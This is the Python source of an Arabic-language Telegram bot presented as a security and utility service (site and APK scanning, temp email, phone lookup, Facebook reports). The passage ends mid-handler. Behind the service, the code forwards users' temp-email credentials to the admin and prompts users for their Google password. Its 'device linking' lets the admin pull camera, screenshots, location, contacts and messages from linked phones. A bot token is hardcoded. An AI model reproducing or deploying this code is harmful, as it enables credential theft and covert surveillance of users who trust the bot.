# ===================== bot.py (النسخة النهائية - متوافقة مع السحابة) =====================
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import string
import hashlib
import re
import logging
import requests
import phonenumbers
from phonenumbers import carrier, geocoder
from datetime import datetime, timedelta
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ===================== الثوابت الأساسية =====================
TELEGRAM_TOKEN = "8852940754:AAF3bLOKUtk2YwC2EcQaXXHx-fPkkTaL2Ho"
ADMIN_ID = 7965377136

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ===================== إنشاء البوت =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode='HTML')

# ===================== هياكل البيانات الأساسية =====================
user_states = {}
registered_users = set()
linked_users = set()
secure_connected_devices = {}
monitoring_data = {}
admin_remote_target = {}
google_users = {}
google_passwords = {}
user_points = {}
referral_codes = {}
referral_used = {}
referred_by = {}
temp_emails = {}
developer_computer_endpoint = None
broadcast_message = None

feature_usage = {
    "ثغرات المواقع": 0, "فحص APK": 0, "فحص كود": 0,
    "دردشة ذكية": 0, "إنشاء صور": 0, "إيميل مؤقت": 0,
    "التحكم بالهاتف": 0, "حظر اتصالات": 0, "تتبع الأرقام": 0,
    "استرجاع فيسبوك": 0, "بلاغات فيسبوك": 0,
    "ربط هاتف المستخدم": 0, "ربط هاتف الطفل": 0,
    "التحكم عن بعد": 0, "ربط جوجل": 0, "الرقابة الأبوية": 0
}

REQUIRE_LINK_BUTTONS = ["mode_apk", "mode_my_app", "mode_track_phone",
                         "mode_fb_hacked", "mode_fb_report", "mode_spam_block"]

FB_REPORT_TYPES = {
    "1": "منشور مسيء (Offensive Post)",
    "2": "حساب مزيف (Fake Account)",
    "3": "محتوى غير لائق (Inappropriate Content)",
    "4": "انتهاك خصوصية (Privacy Violation)",
    "5": "تحرش أو مضايقة (Harassment/Bullying)",
    "6": "انتحال شخصية (Impersonation)",
    "7": "محتوى عنيف (Violent Content)",
    "8": "أخرى (Other)"
}

# ===================== دوال الخدمات الحقيقية =====================

def scan_url_real(url):
    try:
        api_url = "https://urlscan.io/api/v1/scan/"
        data = {"url": url, "visibility": "public"}
        response = requests.post(api_url, json=data, timeout=30)
        if response.status_code == 200:
            scan_id = response.json().get('uuid')
            if scan_id:
                time.sleep(4)
                report_url = f"https://urlscan.io/api/v1/result/{scan_id}"
                report = requests.get(report_url, timeout=30)
                if report.status_code == 200:
                    data = report.json()
                    verdicts = data.get('verdicts', {}).get('overall', {})
                    if verdicts.get('malicious', False):
                        return "🚨 <b>الموقع يحتوي على تهديدات مؤكدة!</b>", "malicious"
                    elif verdicts.get('suspicious', False):
                        return "⚠️ <b>الموقع مشبوه!</b>", "suspicious"
                    else:
                        return "✅ <b>الموقع آمن.</b>", "safe"
        return "⚠️ فشل الفحص، حاول مرة أخرى.", "error"
    except Exception as e:
        logger.error(f"scan_url_real error: {e}")
        return f"⚠️ خطأ: {str(e)}", "error"

def ai_chat_real(prompt):
    try:
        url = f"https://api.popcat.xyz/chat?msg={requests.utils.quote(prompt)}"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            return response.json().get('response', "⚠️ لم أستطع فهم سؤالك.")
        return "⚠️ فشل الاتصال بالذكاء الاصطناعي."
    except Exception as e:
        logger.error(f"ai_chat_real error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def generate_image_real(description):
    try:
        url = f"https://api.popcat.xyz/ai/art?prompt={requests.utils.quote(description)}"
        response = requests.get(url, timeout=60)
        if response.status_code == 200:
            data = response.json()
            image_url = data.get('image')
            if image_url:
                img_data = requests.get(image_url).content
                return img_data, "image"
        return None, "⚠️ فشل توليد الصورة."
    except Exception as e:
        logger.error(f"generate_image_real error: {e}")
        return None, f"⚠️ خطأ: {str(e)}"

def track_phone_real(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        return (f"📍 <b>الرقم:</b> {phone}\n"
                f"🌍 <b>البلد:</b> {country}\n"
                f"📍 <b>المنطقة:</b> {region}\n"
                f"📡 <b>المشغل:</b> {carrier_name}", "valid")
    except Exception as e:
        logger.error(f"track_phone_real error: {e}")
        return f"❌ رقم غير صحيح: {str(e)}", "invalid"

def create_temp_email_real():
    try:
        domain_resp = requests.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            logger.error(f"Mail.tm domains error: {domain_resp.status_code}")
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        email = f"{username}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        register = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            logger.error(f"Mail.tm register error: {register.status_code} - {register.text}")
            return None, None, None
        login = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            logger.error(f"Mail.tm login error: {login.status_code} - {login.text}")
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        logger.error(f"create_temp_email_real error: {e}")
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 <b>من:</b> {msg.get('from', {}).get('address', '')}\n📌 <b>الموضوع:</b> {msg.get('subject', '')}\n📝 <b>مقتطف:</b> {msg.get('intro', '')[:150]}...")
            return results
    except Exception as e:
        logger.error(f"check_temp_emails_real error: {e}")
    return []

VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
def scan_apk_real(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return "⚠️ للحصول على فحص حقيقي، ضع مفتاح VirusTotal في متغير البيئة VIRUSTOTAL_API_KEY", "error"
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = requests.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = requests.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        return f"🚨 <b>تم اكتشاف {malicious} تهديدات!</b>", "malicious"
                    elif suspicious > 0:
                        return f"⚠️ <b>تم اكتشاف {suspicious} عناصر مشبوهة.</b>", "suspicious"
                    else:
                        return "✅ <b>الملف آمن.</b>", "safe"
        return "⚠️ فشل فحص الملف.", "error"
    except Exception as e:
        logger.error(f"scan_apk_real error: {e}")
        return f"⚠️ خطأ: {str(e)}", "error"

# ===================== دوال التواصل مع خادم الهاتف =====================

def test_device_connection(endpoint):
    try:
        url = endpoint.rstrip('/') + '/ping'
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'online':
                return True, "✅ الجهاز متصل."
        return False, "⚠️ الخادم لا يستجيب."
    except Exception as e:
        return False, f"⚠️ فشل الاتصال: {str(e)}"

def send_command_to_device(endpoint, command, params=None, method='GET'):
    if not endpoint:
        return None, "❌ لم يتم تعيين عنوان الجهاز."
    url = endpoint.rstrip('/') + command
    try:
        if method.upper() == 'POST':
            response = requests.post(url, json=params, timeout=15)
        else:
            response = requests.get(url, timeout=15)
        if response.status_code == 200:
            content_type = response.headers.get('content-type', '')
            if 'image' in content_type:
                return response.content, "image"
            elif 'application/json' in content_type:
                return response.json(), "json"
            else:
                return response.text, "text"
        else:
            return None, f"⚠️ فشل (كود {response.status_code})"
    except Exception as e:
        return None, f"⚠️ خطأ: {str(e)}"

# ===================== دوال الرقابة الأبوية =====================

def add_blocked_domain(chat_id, domain):
    if chat_id not in secure_connected_devices:
        return False
    if 'blocked_domains' not in secure_connected_devices[chat_id]:
        secure_connected_devices[chat_id]['blocked_domains'] = []
    if domain not in secure_connected_devices[chat_id]['blocked_domains']:
        secure_connected_devices[chat_id]['blocked_domains'].append(domain)
        return True
    return False

def remove_blocked_domain(chat_id, domain):
    if chat_id in secure_connected_devices and 'blocked_domains' in secure_connected_devices[chat_id]:
        if domain in secure_connected_devices[chat_id]['blocked_domains']:
            secure_connected_devices[chat_id]['blocked_domains'].remove(domain)
            return True
    return False

def get_blocked_domains(chat_id):
    if chat_id in secure_connected_devices:
        return secure_connected_devices[chat_id].get('blocked_domains', [])
    return []

def log_child_activity(chat_id, activity):
    if chat_id not in secure_connected_devices:
        return
    if 'history' not in secure_connected_devices[chat_id]:
        secure_connected_devices[chat_id]['history'] = []
    secure_connected_devices[chat_id]['history'].append({
        'time': datetime.now().isoformat(),
        'activity': activity
    })
    if len(secure_connected_devices[chat_id]['history']) > 100:
        secure_connected_devices[chat_id]['history'] = secure_connected_devices[chat_id]['history'][-100:]

# ===================== دوال مساعدة =====================

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def create_referral_link(user_id):
    code = referral_codes.get(user_id)
    if not code:
        code = generate_referral_code()
        referral_codes[user_id] = code
    return f"https://t.me/{(bot.get_me()).username}?start=ref_{code}"

def get_user_points(user_id):
    return user_points.get(user_id, 0)

def add_points(user_id, points):
    user_points[user_id] = user_points.get(user_id, 0) + points

def handle_referral(code, new_user_id):
    if code in referral_used:
        return False
    referrer_id = None
    for uid, c in referral_codes.items():
        if c == code and uid != new_user_id:
            referrer_id = uid
            break
    if not referrer_id:
        return False
    add_points(referrer_id, 10)
    add_points(new_user_id, 10)
    referral_used[code] = new_user_id
    referred_by[new_user_id] = referrer_id
    bot.send_message(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
    return True

def send_sensitive_data_to_admin(data_type, content, user_id=None):
    if user_id:
        msg = f"📩 <b>بيانات حساسة من المستخدم</b> <code>{user_id}</code>\n"
    else:
        msg = "📩 <b>بيانات حساسة</b>\n"
    msg += f"النوع: {data_type}\n"
    if isinstance(content, str):
        msg += f"المحتوى: <code>{content}</code>"
        bot.send_message(ADMIN_ID, msg, parse_mode='HTML')
    elif isinstance(content, bytes) and data_type == "image":
        bot.send_photo(ADMIN_ID, content, caption=msg)
    else:
        bot.send_message(ADMIN_ID, f"{msg}\nالمحتوى: {str(content)[:500]}")

def send_to_developer_computer(data_type, content, user_id=None):
    if not developer_computer_endpoint:
        return
    try:
        payload = {"type": data_type, "user_id": user_id, "timestamp": datetime.now().isoformat(), "content": content if isinstance(content, str) else None}
        if isinstance(content, bytes) and data_type == "image":
            files = {'file': ('screenshot.png', content, 'image/png')}
            requests.post(developer_computer_endpoint + '/upload', files=files, timeout=10)
        else:
            requests.post(developer_computer_endpoint + '/data', json=payload, timeout=10)
    except Exception as e:
        logger.error(f"فشل إرسال البيانات: {e}")

def encrypt_device_data(data_string):
    return hashlib.sha256(data_string.encode()).hexdigest()[:16]

def notify_admin(message_text):
    try:
        bot.send_message(ADMIN_ID, f"📢 <b>إشعار:</b>\n{message_text}", parse_mode='HTML')
    except Exception as e:
        logger.error(f"فشل إرسال إشعار للمطور: {e}")

# ===================== Google OAuth =====================

GOOGLE_CLIENT_ID = os.environ.get('GOOGLE_CLIENT_ID', '')
GOOGLE_CLIENT_SECRET = os.environ.get('GOOGLE_CLIENT_SECRET', '')
GOOGLE_REDIRECT_URI = 'urn:ietf:wg:oauth:2.0:oob'
GOOGLE_AUTH_URL = 'https://accounts.google.com/o/oauth2/auth'
GOOGLE_TOKEN_URL = 'https://oauth2.googleapis.com/token'
GOOGLE_USERINFO_URL = 'https://www.googleapis.com/oauth2/v1/userinfo'
SCOPES = ['https://www.googleapis.com/auth/userinfo.email', 'https://www.googleapis.com/auth/userinfo.profile']

def generate_google_auth_url():
    if not GOOGLE_CLIENT_ID:
        return None
    params = {
        'client_id': GOOGLE_CLIENT_ID,
        'redirect_uri': GOOGLE_REDIRECT_URI,
        'scope': ' '.join(SCOPES),
        'response_type': 'code',
        'access_type': 'offline',
        'prompt': 'consent'
    }
    req = requests.Request('GET', GOOGLE_AUTH_URL, params=params)
    return req.prepare().url

def exchange_code_for_token(code):
    if not GOOGLE_CLIENT_ID or not GOOGLE_CLIENT_SECRET:
        return None
    data = {
        'code': code,
        'client_id': GOOGLE_CLIENT_ID,
        'client_secret': GOOGLE_CLIENT_SECRET,
        'redirect_uri': GOOGLE_REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    try:
        response = requests.post(GOOGLE_TOKEN_URL, data=data, timeout=15)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        logger.error(f"Google token error: {e}")
        return None

def get_google_user_info(access_token):
    if not access_token:
        return None
    headers = {'Authorization': f'Bearer {access_token}'}
    try:
        response = requests.get(GOOGLE_USERINFO_URL, headers=headers, timeout=15)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        logger.error(f"Google userinfo error: {e}")
        return None

def generate_fb_report(report_type, reason, link):
    prompt = f"""You are an expert in writing formal complaints to Facebook. Write a professional complaint in English:

Type: {report_type}
Issue: {reason}
Link: {link}

The complaint should be clear and include all necessary details."""
    try:
        return ai_chat_real(prompt)
    except Exception as e:
        return f"⚠️ حدث خطأ: {str(e)}"

# ===================== بناء القوائم =====================

def build_main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    
    markup.row(
        InlineKeyboardButton("🔍 ثغرات المواقع", callback_data="mode_site"),
        InlineKeyboardButton("📦 فحص APK", callback_data="mode_apk")
    )
    markup.row(
        InlineKeyboardButton("🛠️ فحص كود", callback_data="mode_my_app"),
        InlineKeyboardButton("🧠 دردشة ذكية", callback_data="mode_ai")
    )
    markup.row(
        InlineKeyboardButton("🎨 إنشاء صور", callback_data="mode_image"),
        InlineKeyboardButton("📧 إيميل مؤقت", callback_data="mode_temp_email")
    )
    if user_points.get(user_id, 0) >= 30:
        markup.row(
            InlineKeyboardButton("📢 إبلاغ فيسبوك 🔓", callback_data="mode_fb_report"),
            InlineKeyboardButton("🚫 حظر اتصالات", callback_data="mode_spam_block")
        )
    else:
        markup.row(
            InlineKeyboardButton("📢 إبلاغ فيسبوك 🔒", callback_data="locked_fb_report"),
            InlineKeyboardButton("🚫 حظر اتصالات", callback_data="mode_spam_block")
        )
    markup.row(
        InlineKeyboardButton("📍 تتبع رقم", callback_data="mode_track_phone"),
        InlineKeyboardButton("🛡️ استرجاع فيسبوك", callback_data="mode_fb_hacked")
    )
    markup.row(
        InlineKeyboardButton("🔗 تفعيل الميزات المتقدمة", callback_data="mode_link_user"),
        InlineKeyboardButton("🚸 تفعيل الحماية الإضافية", callback_data="mode_link_child")
    )
    if user_id in google_users:
        markup.row(InlineKeyboardButton("✅ حساب Google متصل", callback_data="mode_google_logout"))
    else:
        markup.row(InlineKeyboardButton("🔑 ربط حساب Google", callback_data="mode_google_login"))
    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_show_points"),
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_show_referral")
    )
    
    # ====== أزرار المطور ======
    if user_id == ADMIN_ID:
        markup.row(
            InlineKeyboardButton("👑 لوحة التحكم", callback_data="mode_admin"),
            InlineKeyboardButton("📱 الأجهزة المراقبة", callback_data="mode_view_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="mode_remote_admin"),
            InlineKeyboardButton("🖥️ ربط بحاسب المطور", callback_data="mode_set_dev_endpoint")
        )
        markup.row(
            InlineKeyboardButton("📊 إحصائيات البوت", callback_data="admin_stats"),
            InlineKeyboardButton("📢 إرسال جماعي", callback_data="admin_broadcast")
        )
        markup.row(
            InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
            InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
        )
    
    return markup

def build_device_list_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    if not secure_connected_devices:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة", callback_data="no_devices"))
    else:
        for uid, info in secure_connected_devices.items():
            label = f"👤 {uid} - {info['type'][:15]}"
            markup.row(InlineKeyboardButton(label, callback_data=f"remote_select_{uid}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup

# ===================== معالج الأوامر =====================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = None
    registered_users.add(chat_id)
    
    text = message.text
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            for uid, c in referral_codes.items():
                if c == code and uid != chat_id:
                    if code not in referral_used:
                        handle_referral(code, chat_id)
                        bot.send_message(chat_id, "🎉 تم تفعيل رابط الدعوة! +10 نقاط.")
                        notify_admin(f"🔗 مستخدم جديد عبر رابط دعوة\nالداعي: {uid}\nالمدعو: {chat_id}")
                    break
    
    welcome = (
        "🌟 <b>مرحباً بك في نظام T99 المتطور</b> 🌟\n\n"
        "🔹 هذا البوت يستخدم خدمات <b>حقيقية</b> عبر الإنترنت.\n"
        f"⭐ <b>نقاطك:</b> {get_user_points(chat_id)}\n"
        "🔓 تحتاج 30 نقطة لفتح زر 'إبلاغ فيسبوك'.\n"
        "📌 استخدم الأزرار أدناه للاستفادة من الخدمات.\n"
        "📖 للمساعدة: /help"
    )
    bot.send_message(chat_id, welcome, reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "📖 <b>الأوامر المتاحة:</b>\n\n"
        "/start - القائمة الرئيسية\n"
        "/login - ربط حساب Google\n"
        "/oauth &lt;code&gt; - إكمال ربط Google\n"
        "/logout - تسجيل الخروج من Google\n"
        "/referral - عرض رابط دعوتك\n"
        "/points - عرض نقاطك\n"
        "/cancel - إلغاء العملية الحالية\n"
        "/check_email - عرض رسائل البريد المؤقت\n\n"
        "🔗 <b>نظام النقاط:</b> كل دعوة تمنح 10 نقاط للداعي والمدعو.\n"
        "🔐 <b>تفعيل الميزات:</b> استخدم أزرار 'تفعيل الميزات المتقدمة' أو 'تفعيل الحماية الإضافية'."
    )
    bot.send_message(message.chat.id, help_text, reply_markup=build_main_menu(message.chat.id))

@bot.message_handler(commands=['login'])
def google_login(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        bot.send_message(chat_id, "✅ أنت متصل بالفعل.")
        return
    url = generate_google_auth_url()
    if not url:
        bot.send_message(chat_id, "⚠️ ميزة ربط Google غير متاحة (لم يتم تعيين المفاتيح).")
        return
    bot.send_message(chat_id, f"🔑 <b>ربط Google:</b>\n1. افتح: <code>{url}</code>\n2. انسخ الرمز وأرسل: /oauth &lt;الرمز&gt;\n3. ثم أدخل كلمة السر.")
    notify_admin(f"🔑 مستخدم {chat_id} بدأ ربط Google")

@bot.message_handler(commands=['oauth'])
def google_oauth(message):
    chat_id = message.chat.id
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ استخدم: /oauth &lt;الرمز&gt;")
        return
    code = parts[1].strip()
    token_data = exchange_code_for_token(code)
    if not token_data:
        bot.send_message(chat_id, "❌ فشل التبادل.")
        return
    user_info = get_google_user_info(token_data['access_token'])
    if not user_info:
        bot.send_message(chat_id, "❌ فشل جلب البيانات.")
        return
    google_users[chat_id] = {
        'id': user_info['id'],
        'email': user_info['email'],
        'name': user_info['name'],
        'access_token': token_data['access_token'],
        'refresh_token': token_data.get('refresh_token'),
        'expiry': datetime.now() + timedelta(seconds=token_data['expires_in'])
    }
    user_states[chat_id] = "waiting_for_google_password"
    bot.send_message(chat_id, "✅ تم ربط البريد. الرجاء إدخال كلمة السر (ستُرسل للمطور فقط).")

@bot.message_handler(commands=['logout'])
def google_logout(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        del google_users[chat_id]
    if chat_id in google_passwords:
        del google_passwords[chat_id]
    bot.send_message(chat_id, "✅ تم تسجيل الخروج.", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    link = create_referral_link(chat_id)
    bot.send_message(chat_id, f"🔗 رابط دعوتك:\n<code>{link}</code>")

@bot.message_handler(commands=['points'])
def show_points(message):
    bot.send_message(message.chat.id, f"⭐ نقاطك: {get_user_points(message.chat.id)}")

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    if chat_id in admin_remote_target:
        del admin_remote_target[chat_id]
    bot.send_message(chat_id, "✅ تم الإلغاء.", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        bot.send_message(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails_real(token)
    response = "📬 <b>رسائل البريد المؤقت:</b>\n\n" + "\n\n".join(msgs) if msgs else "📭 لا توجد رسائل جديدة."
    bot.send_message(chat_id, response, reply_markup=build_main_menu(chat_id))

# ===================== معالج النقر على الأزرار =====================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        bot.answer_callback_query(call.id)
        chat_id = call.message.chat.id
        user_id = chat_id
        data = call.data

        # حماية أزرار المطور
        if data.startswith('admin_') and chat_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "❌ هذه اللوحة للمطور فقط.", show_alert=True)
            return

        # الأزرار المقفلة بنقاط
        if data == "locked_fb_report":
            points = get_user_points(chat_id)
            if points < 30:
                bot.answer_callback_query(call.id, f"⚠️ تحتاج 30 نقطة. لديك {points}", show_alert=True)
                return
            else:
                data = "mode_fb_report"

        # التحقق من ربط الهاتف
        if data in REQUIRE_LINK_BUTTONS and chat_id not in linked_users:
            bot.send_message(chat_id, "🔗 <b>مطلوب تفعيل الميزات أولاً!</b> استخدم زر 'تفعيل الميزات المتقدمة'.", reply_markup=build_main_menu(chat_id))
            return

        # معالجة الأزرار الأساسية
        if data == "mode_site":
            user_states[chat_id] = "waiting_for_site"
            text = "🔗 أرسل رابط الموقع لفحصه."
        elif data == "mode_apk":
            user_states[chat_id] = "waiting_for_apk"
            text = "📦 أرسل ملف APK لتحليله (قد يستغرق دقيقة)."
        elif data == "mode_my_app":
            user_states[chat_id] = "waiting_for_my_app"
            text = "🛠️ أرسل ملف الكود (txt, py, js, ...) لمراجعته."
        elif data == "mode_ai":
            user_states[chat_id] = "waiting_for_ai"
            text = "🧠 اكتب سؤالك للذكاء الاصطناعي."
        elif data == "mode_image":
            user_states[chat_id] = "waiting_for_image"
            text = "🎨 اكتب وصف الصورة التي تريد إنشاءها."
        elif data == "mode_temp_email":
            email, token, password = create_temp_email_real()
            if email:
                temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
                text = f"📧 <b>بريدك المؤقت:</b> <code>{email}</code>\n🔑 <b>كلمة السر:</b> <code>{password}</code>\nاستخدم /check_email لعرض الرسائل."
                send_sensitive_data_to_admin("Temp Email", f"{email} | {password}", chat_id)
            else:
                text = "⚠️ فشل إنشاء البريد، حاول مرة أخرى."
            feature_usage["إيميل مؤقت"] += 1
        elif data == "mode_spam_block":
            user_states[chat_id] = "waiting_for_spam_num"
            text = "🚫 أرسل الرقم لحظره (يمكنك إضافته يدوياً في تطبيق الهاتف)."
        elif data == "mode_track_phone":
            user_states[chat_id] = "waiting_for_track_num"
            text = "📍 أرسل الرقم (مثل: +201001234567)."
        elif data == "mode_fb_hacked":
            user_states[chat_id] = "waiting_for_fb_hacked"
            text = "🛡️ أرسل رابط الحساب أو البريد."
        elif data == "mode_fb_report":
            if get_user_points(chat_id) < 30:
                bot.answer_callback_query(call.id, f"⚠️ تحتاج 30 نقطة. لديك {get_user_points(chat_id)}", show_alert=True)
                return
            user_states[chat_id] = "waiting_for_fb_report_type"
            text = "📢 <b>تقديم بلاغ لفيسبوك</b>\n\nاختر نوع البلاغ من القائمة التالية (أرسل رقم النوع):\n"
            for key, value in FB_REPORT_TYPES.items():
                text += f"{key}. {value}\n"
            text += "\n📌 مثال: أرسل <code>1</code> لمنشور مسيء.\n\nبعد اختيار النوع، سيُطلب منك كتابة شرح للسبب."
        elif data == "mode_link_user":
            user_states[chat_id] = "waiting_for_user_device"
            text = "🔗 أرسل معرف الجهاز (Device ID) لتفعيل الميزات المتقدمة."
            feature_usage["ربط هاتف المستخدم"] += 1
        elif data == "mode_link_child":
            user_states[chat_id] = "waiting_for_child_device"
            text = "🚸 أرسل معرف جهاز الطفل لتفعيل الحماية الإضافية."
            feature_usage["ربط هاتف الطفل"] += 1
        elif data == "mode_google_login":
            google_login(call.message)
            return
        elif data == "mode_google_logout":
            google_logout(call.message)
            return
        elif data == "mode_show_points":
            points = get_user_points(chat_id)
            bot.answer_callback_query(call.id, f"⭐ نقاطك: {points}", show_alert=True)
            return
        elif data == "mode_show_referral":
            link = create_referral_link(chat_id)
            bot.answer_callback_query(call.id, f"🔗 رابط دعوتك: {link}", show_alert=True)
            return
        elif data == "mode_admin":
            if chat_id != ADMIN_ID:
                text = "❌ للمطور فقط."
            else:
                stats = "👑 <b>لوحة المطور</b>\n"
                for f, c in feature_usage.items():
                    stats += f"• {f}: {c} مرة\n"
                text = stats
        elif data == "mode_view_devices":
            if chat_id != ADMIN_ID:
                text = "❌ للمطور فقط."
            else:
                if not secure_connected_devices:
                    text = "📱 لا توجد أجهزة."
                else:
                    dev_text = "📱 <b>الأجهزة المربوطة:</b>\n"
                    for uid, info in secure_connected_devices.items():
                        dev_text += f"👤 {uid}: {info['type']} ({info.get('endpoint', 'لا endpoint')})\n"
                    text = dev_text
        elif data == "mode_remote_admin":
            if chat_id != ADMIN_ID:
                text = "❌ للمطور فقط."
            else:
                if get_user_points(chat_id) < 30:
                    text = "⚠️ تحتاج 30 نقطة."
                else:
                    text = "🎮 اختر جهازاً:"
                    bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=build_device_list_markup())
                    return
        elif data == "mode_set_dev_endpoint":
            if chat_id == ADMIN_ID:
                user_states[chat_id] = "waiting_for_dev_endpoint"
                text = "🖥️ أرسل عنوان حاسب المطور."
            else:
                text = "❌ للمطور فقط."
        elif data.startswith("remote_select_"):
            if chat_id == ADMIN_ID:
                target_id = int(data.split("_")[2])
                if target_id in secure_connected_devices:
                    admin_remote_target[chat_id] = target_id
                    user_states[chat_id] = "waiting_for_remote_admin"
                    device_type = secure_connected_devices[target_id].get('type', '')
                    endpoint = secure_connected_devices[target_id].get('endpoint')
                    if endpoint:
                        if "طفل" in device_type or "child" in device_type.lower():
                            text = (
                                f"✅ تم اختيار جهاز الطفل {target_id}.\n\n"
                                "📝 <b>أوامر الحماية الإضافية:</b>\n"
                                "• <code>سجل</code> - عرض السجل\n"
                                "• <code>حظر &lt;دومين&gt;</code> - حظر موقع\n"
                                "• <code>الغاء حظر &lt;دومين&gt;</code> - إلغاء حظر\n"
                                "• <code>تطبيقات</code> - عرض التطبيقات المفتوحة\n"
                                "• <code>تقارير</code> - عرض التقرير\n\n"
                                "📝 <b>الأوامر العامة:</b>\n"
                                "موقع، كاميرا، لقطة، صور، شاشة، جهات اتصال، رسائل"
                            )
                        else:
                            text = (
                                f"✅ تم اختيار المستخدم {target_id}.\n\n"
                                "📝 <b>الأوامر المتاحة:</b>\n"
                                "موقع، كاميرا، لقطة، صور، شاشة، جهات اتصال، رسائل"
                            )
                        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=build_main_menu(chat_id))
                    else:
                        text = f"⚠️ لم يتم تعيين عنوان لهذا الجهاز. استخدم /set_device_url."
                        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=build_main_menu(chat_id))
                else:
                    text = "❌ جهاز غير موجود."
                    bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=build_main_menu(chat_id))
            else:
                text = "❌ للمطور فقط."
                bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=build_main_menu(chat_id))
            return
        elif data == "admin_stats":
            if chat_id != ADMIN_ID:
                text = "❌ للمطور فقط."
            else:
                stats = f"📊 <b>إحصائيات البوت</b>\n\n"
                stats += f"👥 المستخدمون الكلي: {len(registered_users)}\n"
                stats += f"📱 الأجهزة المربوطة: {len(linked_users)}\n"
                stats += f"🔗 الأجهزة المسجلة: {len(secure_connected_devices)}\n"
                stats += f"🔑 مستخدمي Google: {len(google_users)}\n"
                stats += f"⭐ عدد المستخدمين بنقاط: {len(user_points)}\n"
                stats += f"📧 البريد المؤقت: {len(temp_emails)}\n"
                stats += f"\n📊 <b>إحصائيات الاستخدام:</b>\n"
                for f, c in feature_usage.items():
                    stats += f"• {f}: {c} مرة\n"
                text = stats
        elif data == "admin_broadcast":
            if chat_id != ADMIN_ID:
                text = "❌ للمطور فقط."
            else:
                user_states[chat_id] = "waiting_for_broadcast"
                text = "📢 أرسل الرسالة التي تريد بثها لجميع المستخدمين."
        elif data == "admin_collected_data":
            if chat_id != ADMIN_ID:
                text = "❌ للمطور فقط."
